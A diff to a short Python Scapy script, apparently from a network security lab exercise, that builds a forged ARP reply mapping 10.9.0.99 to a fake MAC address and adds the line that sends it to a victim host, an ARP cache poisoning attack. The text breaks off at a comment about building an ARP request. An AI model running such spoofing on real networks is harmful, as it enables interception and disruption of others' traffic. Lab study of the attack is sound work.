@@ -1,18 +1,23 @@
 #!/usr/bin/env python3
 from scapy.all import *
 
+### ARP Cache Posioning Attack ###
 IP_V       = "10.9.0.5" # Sender IP Address
 MAC_V_real = "02:42:0a:09:00:05" # Sender MAC Address
 
-IP_T       = "10.9.0.99"
-MAC_T_fake = "aa:bb:cc:dd:ee:ff"
+IP_T       = "10.9.0.99" # Fake IP
+MAC_T_fake = "aa:bb:cc:dd:ee:ff" # Fake Mac Address
 
 # Constructing ARP Reply packet
 ether1  = Ether(src = MAC_T_fake, dst = MAC_V_real)
-arp1    = ARP(psrc = IP_T, hwsrc = MAC_T_fake, 
-             pdst = IP_V, hwdst = MAC_V_real)
-arp1.op = 2   # Reply
+
+arp1    = ARP(psrc = IP_T, hwsrc = MAC_T_fake, pdst = IP_V, hwdst = MAC_V_real)
+
+arp1.op = 2   # 2 = Reply
+
 frame1  = ether1/arp1
+
+sendp(frame1) # send packet
 
 
 # Constructing ARP Request packet
